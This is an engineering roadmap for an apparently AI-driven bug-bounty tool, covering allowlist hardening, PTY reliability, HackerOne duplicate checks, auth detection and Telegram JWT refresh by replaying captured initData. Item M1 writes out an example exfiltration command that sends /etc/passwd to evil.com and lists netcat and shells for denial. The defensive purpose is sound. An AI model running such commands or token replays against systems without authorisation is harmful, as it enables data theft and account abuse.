# Huntress — Live Hunt Readiness Roadmap

> **Created:** April 9, 2026 (Session 8)
> **Updated:** April 10, 2026 (Session 14) — Tier 2 S4 COMPLETE, Auth Wizard added
> **Purpose:** Prioritized task list to take Huntress from its current state (9.2/10) to its first successful HackerOne submission.
> **Audience:** The engineer (human or AI) executing these tasks in future sessions.

This document defines three tiers of work, ordered by criticality. Each tier has a clear gate: you cannot proceed to the next tier until the current one is complete. Every item includes the *why*, the *what*, the exact files involved, estimated effort, and explicit acceptance criteria so there is no ambiguity about what "done" means.

---

## How to Use This Document

1. **Work top-down.** Tier 1 items are sequential — complete M1 before M2, M2 before M3, etc. Tier 2 items can be parallelized.
2. **Verify after every item.** Run the full test suite (`tsc`, `vitest`, `cargo test`, `cargo clippy`) after each change. The build must stay green at all times.
3. **Update this document** as items are completed. Change `[ ]` to `[x]` and add the completion date.
4. **Do not skip items** in Tier 1. Each one addresses a specific risk that could cause an out-of-scope incident, a HackerOne ban, or a wasted submission.

---

## Tier 1: MUST-DO Before Any Live Hunt

These items address **safety vulnerabilities, reliability failures, or missing verification** that would cause the hunt to fail, produce unsafe results, or get the user banned from HackerOne. The live hunt cannot proceed until all four are complete.

**Gate:** All 4 items checked. PASSED (April 9, 2026) — full test suite green, hunt #6 produced 9 findings (0 validated due to Docker sandbox, 0 false positives).

---

### M1: Close the Command Injection Vector in Training Allowlist

- [x] **Status:** COMPLETE (April 9, 2026)
- **Priority:** CRITICAL (safety)
- **Effort:** 30 minutes
- **Files:** `src-tauri/src/lib.rs` (~line 436)

**Problem:** The `ALLOWED_TRAINING_PROGRAMS` allowlist at `lib.rs:436` includes `bash`, `sh`, and `nc` (netcat). The `execute_training_command` Tauri command accepts any program from this list with arbitrary arguments. This means any code path that can call `execute_training_command("bash", ["-c", "curl evil.com/exfil?data=$(cat /etc/passwd)"])` bypasses the entire PTY approval gate, scope validation, and command sanitization pipeline.

**Why this blocks live hunting:** On a live target, if any agent or UI path triggers `execute_training_command`, commands execute without approval, without scope checking, and without redaction. This is the exact class of vulnerability Huntress is designed to find in *other* applications.

**Fix:**
1. Remove `bash`, `sh`, `nc`, and `ncat` from `ALLOWED_TRAINING_PROGRAMS`
2. Keep only the training-specific programs: `python3`, `axolotl`, `accelerate`, `wandb`, `tensorboard`
3. For `python3`: restrict to only execute scripts within a specific training directory (validate the first arg is a path under `scripts/` or a known training entry point)
4. Add a test that verifies `bash`, `sh`, `nc` are rejected

**Acceptance criteria:**
- `cargo test` passes with new deny-path tests
- `execute_training_command("bash", vec!["-c", "id"])` returns an error
- `execute_training_command("python3", vec!["scripts/format_training_data.py"])` still works
- `cargo clippy -- -D warnings` clean

---

### M2: Fix PTY Writer Fragility (H1)

- [x] **Status:** COMPLETE (April 9, 2026)
- **Priority:** HIGH (reliability)
- **Effort:** 2-3 hours
- **Files:** `src-tauri/src/pty_manager.rs` (~lines 340-370)

**Problem:** `PtySession` caches the writer handle on first use via `take_writer()` into an `Arc<Mutex<Option<Box<dyn Write>>>>`. The current implementation has a known issue (H1 in the roadmap): if the writer lock is poisoned (e.g., a thread panicked while holding it), or if the PTY master is dropped before the writer is taken, subsequent `write_input()` calls fail silently with `WriteFailed`. During a hunt, this means an agent's command never executes, the agent times out, and the finding is lost.

**Why this blocks live hunting:** Agents execute 30-80 ReAct loop iterations, each potentially running commands. A single writer failure mid-loop kills the entire agent run. With 20+ agents per hunt, even a 5% failure rate means 1-2 agents silently die per hunt.

**Fix:**
1. Add writer recovery: if the cached writer returns an error, attempt to re-acquire from master via `try_clone()` or re-open
2. Add explicit error logging when writer acquisition fails (currently silent)
3. Add a health check method `is_writer_healthy()` that the dispatch loop can call before assigning a PTY session to an agent
4. Add tests: write after first write succeeds, write after simulated lock poison recovers or returns clear error

**Acceptance criteria:**
- `cargo test` passes with new writer reliability tests
- Multiple sequential `write_input()` calls to the same session succeed
- Writer failure produces a clear error message (not silent)
- `cargo clippy -- -D warnings` clean

---

### M3: Test H1 Duplicate Check Against Live API

- [x] **Status:** COMPLETE (April 9, 2026)
- **Priority:** HIGH (credibility)
- **Effort:** 2-3 hours
- **Files:** `src/core/reporting/h1_duplicate_check.ts`, `src/tests/phase4_h1_api.test.ts`

**Problem:** The duplicate checker has a 14-test mock harness that verifies response parsing logic, but it has never been run against the real HackerOne `/hacktivity` endpoint. The API response format may have changed, pagination may have different limits, rate limiting may reject rapid queries, or the similarity scoring thresholds (0.9 skip, 0.7 review) may not match real-world duplicate patterns.

**Why this blocks live hunting:** Submitting a duplicate report to HackerOne damages your reputation score. Programs track researcher signal quality. A researcher who submits known duplicates gets deprioritized by triage teams. The first submission must demonstrate that duplicate detection works.

**Fix:**
1. Set `H1_API_USERNAME` and `H1_API_TOKEN` environment variables (the conditional live tests in `phase4_h1_api.test.ts` activate when these are set)
2. Run `checkDuplicate()` against 3-5 real H1 programs with known disclosed reports
3. Verify the `/hacktivity` response parses correctly (check for API format changes)
4. Test with a known duplicate (should score >0.7) and a known unique finding (should score <0.7)
5. Tune similarity thresholds if real-world data shows the current 0.9/0.7 split is miscalibrated
6. Verify rate limiting doesn't block rapid consecutive checks (add delay if needed)

**Acceptance criteria:**
- Live tests pass when H1 credentials are provided
- At least 1 known duplicate correctly classified as `possible_duplicate` or `likely_duplicate`
- At least 1 known unique finding correctly classified as `unique`
- Response parsing handles current H1 API format without errors
- All existing mock tests still pass

---

### M4: Run Calibration Hunt #6 Against Juice Shop

- [x] **Status:** COMPLETE (April 9, 2026) — 9 findings, 7/8 targets met
- **Priority:** CRITICAL (integration verification)
- **Effort:** 1-2 hours (interactive)
- **Depends on:** M1, M2 (M3 can run in parallel)

**Problem:** 128 new tests and 5 major features have been added since Hunt #5 (the last live hunt). Session 7 added retry logic, approval timeouts, and the auth manager. Session 8 added the Docker attack machine, API schema import, report quality verification, and the validation pipeline. None of these have been tested together in a real hunt. Integration bugs are common — Hunt #5 itself exposed 9 integration bugs that didn't appear in unit tests.

**Why this blocks live hunting:** Running untested code against a real HackerOne program risks: (1) out-of-scope requests from integration mismatches, (2) budget exhaustion from retry loops gone wrong, (3) approval gate failures from the new timeout logic, (4) validation pipeline crashes blocking finding display.

**Execution plan:**
1. Start Docker services: `docker compose --profile testing up -d` (Qdrant + Juice Shop)
2. Launch Huntress: `npm run tauri dev`
3. Import scope: localhost:3001, set budget to $15, all approval gates ON (no auto-approve)
4. Let the full agent fleet run (5 concurrent, rest queued)
5. Monitor for: approval popups appearing, validation badges updating, budget tracking accurate, retry logic firing on transient errors
6. After hunt completes, record metrics using `hunt_metrics.ts` types

**Acceptance criteria:**
- Hunt completes without crashes
- >0 findings with validation status (not all `pending`)
- Budget tracking shows accurate dollar amounts
- Approval gate popups appear for dangerous commands
- Zero out-of-scope request attempts
- Dead-letter queue has <3 entries (retry logic works)
- Record metrics: findings count, severity distribution, validation pass rate, cost, duration

---

## Tier 2: SHOULD-DO Before First H1 Submission

These items significantly improve the **success rate of the first submission**. A submission made without these fixes is more likely to be rejected as duplicate, scored incorrectly, or flagged as low-quality. Complete these before submitting any report to HackerOne.

**Gate:** ALL 5 items COMPLETE. S4 completed in Session 14 (auth context management — UI, secure storage, ReactLoop injection, hunt init). Report quality upgrade completed in Session 13 (RQ1-RQ6).

---

### S1: Fix GitHub + Internal Duplicate Sources (H14)

- [x] **Status:** COMPLETE (April 9, 2026, Session 12)
- **Effort:** 2-3 hours
- **Files:** `src/core/reporting/h1_duplicate_check.ts` (~lines 678-698)

**Problem:** `githubMatch` and `internalMatch` are hardcoded to `0` in the duplicate score result. The duplicate scorer has 4 data sources (H1 hacktivity, GitHub security advisories, internal finding history, and cross-program matches), but only the H1 source produces real scores. This permanently underweights duplicate risk — a vulnerability that's well-documented on GitHub will get a "unique" rating.

**Fix:**
1. Implement GitHub advisory search (use GitHub API `/advisories` endpoint or search for CVE/CWE matches)
2. Implement internal match against the knowledge graph (Qdrant vector similarity on past findings)
3. Weight the composite score properly across all sources

**Acceptance criteria:**
- `githubMatch` returns a non-zero score when the finding matches a known GitHub advisory
- `internalMatch` returns a non-zero score when a similar finding exists in Qdrant
- Overall duplicate score correctly increases when multiple sources agree

---

### S2: Fix Chain Detection Title-Matching (H13)

- [x] **Status:** COMPLETE (April 9, 2026, Session 12)
- **Effort:** 3-4 hours
- **Files:** `src/core/orchestrator/chain_detector.ts`

**Problem:** `detectChains()` builds exploit chains by matching finding titles against hardcoded pattern pairs (e.g., "open redirect" + "OAuth" → chain). It never verifies that the chain is actually exploitable. Reporting an unverified "Critical: Authentication Bypass Chain" to HackerOne when the components can't actually be chained together damages credibility.

**Fix:**
1. After detecting a potential chain by title matching, dispatch a targeted validation task
2. The validation task should attempt the chain end-to-end (e.g., use the open redirect to steal the OAuth token)
3. Only report chains that pass validation as "confirmed chains"
4. Unverified chains should be marked as "potential chain — needs manual verification"

**Acceptance criteria:**
- Chain detection produces a `validated: boolean` field
- Unvalidated chains display a different badge than validated ones
- Test: two findings that title-match but can't be chained → `validated: false`

---

### S3: Wire Real CVSS Calculator into PoC Generator (H15)

- [x] **Status:** COMPLETE (April 9, 2026, Session 12)
- **Effort:** 1-2 hours
- **Files:** `src/core/reporting/poc_generator.ts` (~line 416), `src/core/reporting/cvss_calculator.ts`

**Problem:** `poc_generator.ts` computes CVSS scores using keyword heuristics ("remote code execution" → 9.8, "XSS" → 6.1). A spec-compliant CVSS 3.1 calculator already exists in `cvss_calculator.ts` but isn't wired into the report generation pipeline. H1 triagers compare the CVSS score against their own calculation — a mismatch signals low-quality research.

**Fix:**
1. Import `cvss_calculator.ts` into `poc_generator.ts`
2. Generate a proper CVSS 3.1 vector string based on finding attributes (attack vector, complexity, privileges, user interaction, scope, impact)
3. Use the calculator to derive the numeric score from the vector
4. Include the vector string in the report (e.g., `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)

**Acceptance criteria:**
- Generated reports include a CVSS vector string, not just a numeric score
- The numeric score matches the vector (calculator output)
- CVSS score matches the declared severity level (critical/high/medium/low ranges)

---

### S4: Build Auth Context Management UI

- [x] **Status:** COMPLETE (April 10, 2026, Session 14)
- **Effort:** 3 hours
- **Files:** `src/contexts/SettingsContext.tsx`, `src/components/SettingsPanel.tsx`, `src/core/engine/react_loop.ts`, `src/core/orchestrator/orchestrator_engine.ts`, `src/contexts/HuntSessionContext.tsx`, all 27 agents

**What was built (4 sub-tasks):**
1. **S4-B:** `AuthProfileConfig` type + `authProfiles` field in `AppSettings` + `addAuthProfile`/`removeAuthProfile`/`getAuthProfileCredentials` methods with credentials in `secure_storage.rs` via `auth_profile_{id}_{credKey}` key pattern
2. **S4-A:** Auth tab in `SettingsPanel.tsx` with profile list, add form (bearer/form login/API key/custom headers), save/delete buttons
3. **S4-C:** `sessionManager` + `authSessionId` added to `ReactLoopConfig`. Auth injection in `handleHttpRequest()` — `applyToRequest()` before HTTP call, `updateFromResponse()` after. All 27 agents wired with SessionManager import + auth forwarding
4. **S4-D:** Hunt init in `HuntSessionContext.importProgram()` loads auth profiles + credentials from secure storage, creates live sessions via `SessionManager.login*()`. Failures warn but don't block hunt.

**Tests:** 25 new tests in `src/tests/s4_auth_context.test.ts`. Build: 1,611 TS (55 files) + Rust all green.

**Remaining gap:** Auth setup is manual — user must know what auth tokens a target needs and configure profiles in Settings before importing. See **S6: Auth Detection Wizard** below for the automated solution.

---

### S5: Fix "Blocked dispatch: undefined is not in scope" (H12)

- [x] **Status:** COMPLETE (April 9, 2026, Session 12)
- **Effort:** 1 hour
- **Files:** `src/core/orchestrator/orchestrator_engine.ts`

**Problem:** Occasionally, `dispatchAgent()` logs "Blocked dispatch: undefined is not in scope" — the `target` field on a `HuntTask` is undefined. This means the task was enqueued without a target, likely from a follow-up task generation path that doesn't extract the target from the parent finding.

**Fix:**
1. Search for all `taskQueue.enqueue()` calls and verify `target` is always set
2. Add a guard in `dispatchAgent()`: if `target` is undefined, log a warning with the task details and skip (don't crash)
3. Fix the root cause in the follow-up task generation (`generateFollowUpTasks()` in `task_queue.ts`)

**Acceptance criteria:**
- No "undefined is not in scope" messages during calibration hunt
- Guard prevents crash if a task somehow has no target
- Root cause identified and fixed with a test

---

### S6: Auth Detection Wizard — Automated Auth Wall Detection + Guided Setup

- [x] **Status:** COMPLETE (April 10, 2026, Session 15)
- **Priority:** HIGH (usability — automates the biggest friction point in real-world hunting)
- **Effort:** 6-8 hours
- **Depends on:** S4 (COMPLETE)
- **Files (new):** `src/core/auth/auth_detector.ts`, `src/components/AuthWizardModal.tsx`
- **Files (modified):** `src/contexts/HuntSessionContext.tsx`, `src/App.tsx`
- **Tests:** 37 new tests in `src/tests/s6_auth_detector.test.ts`. Build: 1,648 TS (56 files) + Rust all green.

#### Problem

Session 14 built auth context management (S4) — profiles can be created, credentials stored, and agents use auth automatically. But the user must **already know** what auth mechanism a target uses, what tokens are needed, and where to get them. This manual research was always the step that blocked Hunt #8.

90%+ of real-world HackerOne targets require authentication. Every time a user imports a new program, they face the same questions: "Does this target need auth? What kind? How do I get the tokens?" The platform should answer these questions automatically.

#### Solution: Post-Import Auth Detection Wizard

A two-phase system that runs automatically after every program import:

**Phase 1: AuthDetector Service** — Probes targets + analyzes program text to detect auth requirements

**Phase 2: AuthWizardModal** — Shows results in a popup wizard with guided setup and inline credential forms

#### Component 1: AuthDetector Service (`src/core/auth/auth_detector.ts`)

A stateless service that takes in-scope targets + program metadata and returns structured auth detection results.

**Detection methods (run concurrently):**

1. **HTTP Probing** — GET request to each in-scope target (first 8 targets, 5s timeout each)
   - Status 401/403 → auth wall detected
   - Status 302/307 with `Location` containing `/login`, `/signin`, `/auth`, `/sso`, `/oauth` → redirect-to-login detected
   - `WWW-Authenticate` header → auth scheme identified (Basic, Bearer, Negotiate, etc.)
   - Response body contains login form (`<input type="password">`, `name="username"`, etc.) → form-based login detected
   - Check for common auth-related response headers: `X-Auth-Required`, `X-Login-Url`

2. **Program Text Analysis** — Regex/keyword scan of program name, description, rules, and scope entries
   - **Telegram patterns:** `telegram`, `mini app`, `webapp`, `twa`, `initData`, `@botname` → Telegram WebApp auth (custom headers)
   - **OAuth patterns:** `oauth`, `openid`, `sso`, `saml` → OAuth/SSO flow (bearer token)
   - **API key patterns:** `api key`, `api_key`, `x-api-key`, `apikey` → API key auth
   - **JWT patterns:** `jwt`, `bearer`, `token`, `authorization` → Bearer token auth
   - **Session patterns:** `login`, `session`, `cookie`, `credentials` → Form-based login
   - **Mobile app patterns:** `mobile`, `app`, `android`, `ios` → Likely bearer/API key

3. **Technology Fingerprinting** — From probe response headers
   - `Server: cloudflare` + 403 → Cloudflare Access / Zero Trust (bearer token)
   - `X-Powered-By: Express` + `/api/` paths → Node.js API (likely bearer/JWT)
   - `Set-Cookie: PHPSESSID` → PHP session (form-based login)
   - `Set-Cookie: csrftoken` → Django (form-based with CSRF)
   - `X-Frame-Options: DENY` on Telegram domain → Telegram Mini App constraints

**Return type:**
```typescript
interface AuthDetectionResult {
  /** Whether any target requires authentication */
  requiresAuth: boolean;
  /** Overall confidence in the detection (0-1) */
  confidence: number;
  /** Per-target probe results */
  probeResults: TargetProbeResult[];
  /** Auth types detected with evidence */
  detectedAuthTypes: DetectedAuthType[];
  /** Suggested auth profiles the user should create */
  suggestedProfiles: SuggestedAuthProfile[];
  /** Step-by-step instructions for manual setup (generated based on detected auth type) */
  manualSteps: string[];
  /** Keywords found in program text */
  programHints: string[];
}

interface TargetProbeResult {
  url: string;
  status: number;
  authWall: boolean;
  redirectsToLogin: boolean;
  loginUrl?: string;         // Extracted from Location header
  wwwAuthenticate?: string;  // Raw WWW-Authenticate header value
  hasLoginForm: boolean;
  techFingerprint?: string;  // e.g., "Django", "Express", "PHP"
  error?: string;            // Network error (target down, DNS fail)
}

interface DetectedAuthType {
  type: 'bearer' | 'cookie' | 'api_key' | 'custom_header' | 'oauth' | 'telegram_webapp' | 'basic';
  confidence: number;        // 0-1
  evidence: string;          // Human-readable explanation of why this was detected
  headerName?: string;       // For API key: suggested header name
  loginUrl?: string;         // For form login: detected login page URL
}

interface SuggestedAuthProfile {
  label: string;
  authType: AuthProfileConfig['authType'];
  url?: string;
  headerName?: string;
  /** Ordered instructions the user must follow */
  instructions: string[];
  /** Whether the platform can fully automate this (e.g., API key just needs paste) */
  automationLevel: 'full' | 'partial' | 'manual';
}
```

**Key design decisions:**
- Probes are read-only (GET only, no POST) — safe for any target
- Probes go through `HttpClient` → scope validation still enforced
- 5-second timeout per target prevents blocking on unresponsive hosts
- Maximum 8 targets probed (not all in-scope entries — some scopes have 50+ entries)
- Results are deterministic — no LLM calls, pure heuristics

#### Component 2: AuthWizardModal (`src/components/AuthWizardModal.tsx`)

A modal dialog that appears after program import when `AuthDetectionResult.requiresAuth === true`. Follows the existing modal pattern (fixed positioning, backdrop overlay, monospace styling, `#ef4444` accent).

**Wizard flow (3 steps):**

**Step 1: Detection Summary**
- Header: `[AUTH REQUIRED]` with red accent
- List of targets that returned 401/403 with status indicators
- Detected auth type with confidence badge (e.g., `[TELEGRAM WEBAPP — 92% confidence]`)
- Evidence explanation in plain language (e.g., "Program name contains 'Telegram', target returns 403 without auth headers")
- Button: `[CONFIGURE AUTH]` → Step 2, or `[SKIP — HUNT WITHOUT AUTH]` → closes wizard

**Step 2: Auth Profile Setup** (inline — no navigation to Settings)
- Pre-populated form based on `SuggestedAuthProfile`:
  - Label pre-filled (e.g., "Telegram User")
  - Auth type pre-selected
  - For bearer: token input + validation URL pre-filled from probe
  - For form login: login URL pre-filled from redirect, username/password inputs
  - For API key: header name pre-filled, key input
  - For custom headers: key names pre-filled from detection, value inputs
- Step-by-step instructions rendered as numbered list below the form
  - Each instruction is specific to the detected auth type
  - Example for Telegram: "1. Open Telegram Desktop. 2. Open the @wallet bot. 3. Launch the Mini App. 4. Open DevTools (F12) → Network tab. 5. Copy the Authorization header from any API request. 6. Paste it below."
- `[TEST AUTH]` button — validates the credentials work by making a probe request with the configured auth
- Test result shown inline (green success or red failure with HTTP status)
- `[ADD ANOTHER PROFILE]` — for IDOR testing (User B)

**Step 3: Confirmation**
- Summary of configured profiles with status
- Active session count
- `[START HUNT]` button → creates sessions in SessionManager, closes wizard, proceeds to `analyzeBountyProgram()`
- `[BACK]` → return to Step 2

**UI styling (match existing patterns):**
- `width: 600px`, `maxWidth: 90vw`, `maxHeight: 85vh`
- `backgroundColor: '#111827'`, `border: '1px solid #374151'`
- Tab-like step indicators at top
- All inputs: `backgroundColor: '#000000'`, `border: '1px solid #4b5563'`, `color: '#ffffff'`
- Buttons: save style from SettingsPanel (`#15803d` green for confirm, `#991b1b` red for skip/danger)

#### Component 3: Integration Wiring

**`HuntSessionContext.tsx` changes:**
1. Add state: `authDetectionResult: AuthDetectionResult | null`
2. Add state: `pendingGuidelinesForAuth: ProgramGuidelines | null`
3. In `importProgram()`, after engine init but BEFORE `analyzeBountyProgram()`:
   - If `settings.authProfiles.length === 0` (no pre-configured auth):
     - Run `AuthDetector.detect(guidelines.scope.inScope, programDescription, httpClient)`
     - If `result.requiresAuth`:
       - Set `authDetectionResult` and `pendingGuidelinesForAuth`
       - Return early (do NOT call `analyzeBountyProgram()` yet)
     - If `!result.requiresAuth`: proceed normally
   - If auth profiles already configured: skip detection, proceed normally
4. Add `continueAfterAuth()` method:
   - Called by AuthWizardModal when user completes or skips auth setup
   - Creates live sessions from any newly-added profiles
   - Calls `analyzeBountyProgram(pendingGuidelinesForAuth)`
   - Clears `authDetectionResult` and `pendingGuidelinesForAuth`
5. Add `skipAuth()` method:
   - Called when user clicks "Skip — Hunt Without Auth"
   - Proceeds to `analyzeBountyProgram()` without auth
   - Clears detection state

**`App.tsx` changes:**
1. Import `AuthWizardModal`
2. Destructure `authDetectionResult`, `pendingGuidelinesForAuth`, `continueAfterAuth`, `skipAuth` from `useHuntSession()`
3. Render `<AuthWizardModal>` when `authDetectionResult` is set (zIndex above ImportModal)
4. Wire `onComplete` → `continueAfterAuth`, `onSkip` → `skipAuth`

#### Acceptance Criteria

| Requirement | How to Verify |
|-------------|--------------|
| Auth walls detected automatically | Import a program with auth-required targets → wizard appears |
| Telegram WebApp detected from program name | Import "Wallet on Telegram" → suggests custom headers with Telegram instructions |
| 401/403 detected from probe | Import a program with targets returning 401 → shown in wizard |
| Redirect-to-login detected | Import a program where targets redirect to /login → login URL pre-filled |
| API key detected from program text | Import a program mentioning "API key" → suggests API key profile |
| User can configure auth in wizard | Fill in credentials in wizard → profile saved to secure storage |
| Test button validates auth | Click Test → shows success/fail with HTTP status |
| Skip works without crash | Click "Skip" → hunt proceeds without auth, agents run unauthenticated |
| Wizard doesn't block pre-configured auth | Configure profiles in Settings FIRST → import → wizard doesn't appear |
| Hunt starts after wizard completion | Complete wizard → hunt automatically starts with auth sessions active |

#### Test Plan

1. **AuthDetector unit tests** (`src/tests/s6_auth_detector.test.ts`):
   - 401 response → `authWall: true`
   - 403 response → `authWall: true`
   - 302 → /login → `redirectsToLogin: true`, `loginUrl` extracted
   - 200 OK → `authWall: false`
   - Network error → graceful degradation, `error` field set
   - Program text "Telegram" → `telegram_webapp` type detected
   - Program text "API key" → `api_key` type detected
   - Program text "OAuth" → `bearer` type detected
   - No auth signals → `requiresAuth: false`
   - Mixed results (some 200, some 401) → `requiresAuth: true`
   
2. **Integration tests**:
   - AuthDetector + SessionManager flow: detect → suggest → create profile → validate
   - Graceful degradation: all probes fail → wizard shows with "unable to probe" message

### S7: Automated Token Refresh & Telegram Auth Lifecycle Management

- [x] **Status:** COMPLETE (Session 16 — 41 tests, 1689 total)
- **Priority:** CRITICAL (blocks all authenticated hunting — Hunt #9 depends on this)
- **Effort:** 8-10 hours
- **Depends on:** S4 (COMPLETE), S6 (COMPLETE)
- **Files (modified):** `src/core/auth/session_manager.ts`, `src/core/engine/react_loop.ts`, `src/core/auth/auth_detector.ts`, `src/components/AuthWizardModal.tsx`, `src/contexts/HuntSessionContext.tsx`, `src/contexts/SettingsContext.tsx`
- **Files (new):** `src/core/auth/token_refresher.ts`, `src/tests/s7_token_refresh.test.ts`

#### Problem

Hunt #9 (Session 15) against "Wallet on Telegram" confirmed the critical auth lifecycle gap: JWT tokens expire every ~10 minutes. Within 12 minutes of hunt start, all agents hitting authenticated endpoints received 401s. 112 queued agents burned budget testing unauthenticated paths only. The IDOR Hunter found 50+ API endpoints but couldn't test a single one because tokens expired mid-run.

The existing SessionManager has `refreshSession()` and `authenticatedRequest()` (401 → refresh → retry), but:
1. **Bearer/custom_header tokens return `undefined` from `refreshSession()`** — only form-based login is implemented
2. **The ReAct loop calls `httpClient.request()` directly**, bypassing `authenticatedRequest()` entirely — agents never get 401 auto-retry
3. **No token expiration tracking** — the `expiresAt` field on `AuthenticatedSession` exists but is never populated for bearer/custom tokens
4. **No Telegram-specific re-auth flow** — no way to exchange cached credentials for fresh tokens

#### Key Research Findings (Session 15)

Investigation of the Telegram WebApp auth spec revealed:

1. **Telegram initData is replayable.** No nonce, no single-use mechanism. It's a static HMAC-signed query string. The same initData can be POSTed repeatedly to get fresh JWTs.
2. **initData expiry is server-side only.** Telegram's protocol does not enforce `auth_date` staleness. The target server chooses the window — common values are 5 minutes, 1 hour, or 1 day. Many apps use no expiry.
3. **The Telegram SDK does NOT refresh initData.** `window.Telegram.WebApp.initData` is set once at Mini App launch and never changes.
4. **The wallet uses two JWT systems:**
   - `/api/v1/*` endpoints: `authorization` header (HS256 JWT, ~10 min TTL)
   - `/v2api/*` endpoints: `wallet-authorization` header (ES256 JWT, ~10 min TTL)
   - Both obtained from POST `/alectryon/public-api/auth` with initData body
5. **Additional required headers:** `x-wallet-device-serial` (UUID, does not expire)

#### Solution: Three-Layer Token Lifecycle System

**Layer 1: initData Capture & Storage (one-time manual step)**

During the Auth Wizard flow, capture not just the JWT tokens but also the **initData payload** and the **auth endpoint URL**. Store these alongside the auth profile:

```typescript
interface TelegramAuthData {
  /** The raw initData string from Telegram WebApp */
  initData: string;
  /** The auth endpoint URL that exchanges initData for JWTs */
  authEndpointUrl: string;
  /** Device serial UUID (does not expire) */
  deviceSerial: string;
  /** Token TTL in seconds (detected from JWT exp claim or default 600) */
  tokenTtlSeconds: number;
  /** Mapping of JWT claim → header name for multi-header systems */
  tokenHeaderMap: Record<string, string>;
}
```

Changes to AuthWizardModal:
- Add a collapsed "Advanced: Paste initData for auto-refresh" section in Step 2
- Instructions guide user to copy the POST body from the `/alectryon/public-api/auth` request (the JSON containing initData)
- Parse the auth endpoint URL from the probe results or let user paste it
- Store initData in secure storage (encrypted, same as credentials)

**Layer 2: Automatic Token Refresh Service (`token_refresher.ts`)**

A new `TokenRefresher` class that:

```typescript
class TokenRefresher {
  /**
   * Refresh tokens by re-POSTing cached initData to the auth endpoint.
   * Returns fresh JWT tokens mapped to their header names.
   */
  async refreshTelegramTokens(
    authData: TelegramAuthData,
    httpClient: HttpClient,
  ): Promise<Record<string, string>>;

  /**
   * Parse JWT exp claim to determine token TTL.
   * Returns milliseconds until expiry.
   */
  getTokenExpiry(jwt: string): number;

  /**
   * Check if a session needs refresh (within threshold of expiry).
   * Default threshold: 90 seconds before expiry.
   */
  needsRefresh(session: AuthenticatedSession, thresholdMs?: number): boolean;
}
```

The refresh flow:
1. POST `{ initData }` to `authEndpointUrl` with `Content-Type: application/json` and `x-wallet-device-serial` header
2. Parse the JSON response for token fields (auto-detect field names from response keys)
3. Map tokens to headers using `tokenHeaderMap`
4. Update the `AuthenticatedSession` headers and `expiresAt` field
5. Log: `[auth-refresh] Tokens refreshed for session ${id} (expires in ${ttl}s)`

Error handling:
- If the auth endpoint returns non-200 → initData likely expired. Emit a **hunt-wide pause event** and show a modal: "Auth tokens expired. Please re-capture initData from Telegram."
- If network error → retry once after 2s, then mark session as degraded
- Rate limit: max 1 refresh per 30 seconds per session (prevent refresh storms)

**Layer 3: Wire 401 Auto-Retry into Agent HTTP Layer**

The most impactful single change — route agent HTTP requests through `authenticatedRequest()`:

In `react_loop.ts` `handleHttpRequest()`, change:
```typescript
// BEFORE (current):
const response = await this.config.httpClient.request(options);

// AFTER:
let response: HttpResponse;
if (this.config.authSessionId && this.config.sessionManager) {
  response = await this.config.sessionManager.authenticatedRequest(
    this.config.authSessionId,
    options,
  );
} else {
  response = await this.config.httpClient.request(options);
}
```

Extend `SessionManager.refreshSession()` to handle custom_header/bearer with TokenRefresher:
```typescript
async refreshSession(sessionId: string): Promise<AuthenticatedSession | undefined> {
  // ... existing form-login refresh ...

  // NEW: Telegram/custom token refresh via TokenRefresher
  const telegramData = this.storedTelegramData.get(sessionId);
  if (telegramData) {
    const freshTokens = await this.tokenRefresher.refreshTelegramTokens(
      telegramData, this.httpClient,
    );
    const session = this.sessions.get(sessionId);
    if (session) {
      Object.assign(session.headers, freshTokens);
      session.expiresAt = Date.now() + telegramData.tokenTtlSeconds * 1000;
      return session;
    }
  }

  return undefined;
}
```

**Proactive refresh** — before each request, check if tokens are near expiry:
```typescript
// In react_loop.ts, BEFORE the HTTP request:
if (this.config.authSessionId && this.config.sessionManager) {
  const session = this.config.sessionManager.getSession(this.config.authSessionId);
  if (session?.expiresAt) {
    const msUntilExpiry = session.expiresAt - Date.now();
    if (msUntilExpiry < 90_000) { // 90 seconds threshold
      await this.config.sessionManager.refreshSession(this.config.authSessionId);
    }
  }
}
```

This creates a three-layer defense:
1. **Proactive**: Refresh before expiry (prevents 401s entirely)
2. **Reactive**: 401 → auto-refresh → retry (catches edge cases)
3. **Fallback**: If refresh fails, pause hunt and prompt user

#### Implementation Steps

```
Step 1: TokenRefresher service          (src/core/auth/token_refresher.ts)
  - JWT expiry parsing (decode base64 payload, read exp claim)
  - Telegram initData re-exchange (POST to auth endpoint)
  - Rate limiting (1 refresh per 30s per session)
  - Error classification (expired initData vs network error vs server error)

Step 2: Extend SessionManager           (src/core/auth/session_manager.ts)
  - Add storedTelegramData map
  - Extend refreshSession() for custom_header/bearer with TokenRefresher
  - Add setTelegramData() method for storing initData+authEndpoint
  - Populate expiresAt from JWT exp claim on session creation

Step 3: Wire 401 auto-retry             (src/core/engine/react_loop.ts)
  - Replace httpClient.request() with authenticatedRequest() for authed sessions
  - Add proactive refresh check before each request (90s threshold)
  - Log refresh events as system messages

Step 4: Extend AuthWizardModal           (src/components/AuthWizardModal.tsx)
  - Add "Paste initData for auto-refresh" section for telegram_webapp type
  - Add auth endpoint URL field (pre-filled from detection)
  - Store initData + endpoint in secure storage alongside credentials

Step 5: Extend SettingsContext           (src/contexts/SettingsContext.tsx)
  - Add telegramAuthData fields to AuthProfileConfig
  - Store/retrieve initData from secure storage

Step 6: Hunt init wiring                (src/contexts/HuntSessionContext.tsx)
  - Pass TelegramAuthData to SessionManager on session creation
  - Set up proactive refresh scheduling
  - Handle refresh-failed events (pause hunt, prompt user)

Step 7: Tests                           (src/tests/s7_token_refresh.test.ts)
  - Token expiry detection from JWT claims
  - initData re-exchange produces fresh tokens
  - 401 → auto-refresh → retry flow
  - Proactive refresh triggers at 90s threshold
  - Expired initData → hunt pause event
  - Rate limiting prevents refresh storms
  - Multi-header token systems (authorization + wallet-authorization)
  - Graceful degradation when no initData stored

Verify: tsc + vitest after each step
```

#### Acceptance Criteria

| Requirement | How to Verify |
|-------------|--------------|
| Tokens refresh automatically before expiry | Start hunt with 10-min JWT → agents still authenticated after 20 min |
| 401 triggers auto-refresh and retry | Mock 401 response → verify refresh called, request retried with new token |
| initData re-exchange works | POST cached initData to auth endpoint → receive fresh JWTs |
| Multi-header systems supported | Both `authorization` and `wallet-authorization` refreshed from single auth call |
| Expired initData detected | Auth endpoint returns 401/403 → hunt pauses with user prompt |
| Refresh rate-limited | Multiple 401s in 5 seconds → max 1 refresh attempt |
